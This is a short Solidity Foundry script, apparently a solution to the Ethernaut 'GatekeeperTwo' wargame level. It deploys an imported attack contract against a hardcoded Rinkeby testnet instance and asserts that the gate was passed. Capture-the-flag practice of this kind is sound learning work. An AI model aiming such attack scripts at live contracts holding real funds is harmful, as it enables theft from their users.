// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";

import { GatekeeperTwo } from "src/GatekeeperTwo/GatekeeperTwo.sol";

import { GatekeeperTwoAttack } from "src/GatekeeperTwo/GatekeeperTwoAttack.sol";

contract GatekeeperTwoAttackScript is Script {

    // target: https://rinkeby.etherscan.io/address/0x64eb720B18dF5578B4E47aa8fc8311D4F1Eb4989#internaltx

    address gatekeeperTwoInstance = address(0x64eb720B18dF5578B4E47aa8fc8311D4F1Eb4989);
    function run() public {
        vm.startBroadcast();
            GatekeeperTwoAttack attacker = new GatekeeperTwoAttack(gatekeeperTwoInstance);
            bool success = GatekeeperTwo(gatekeeperTwoInstance).entrant() != address(0);
            assert(success);
        vm.stopBroadcast();
    }
}
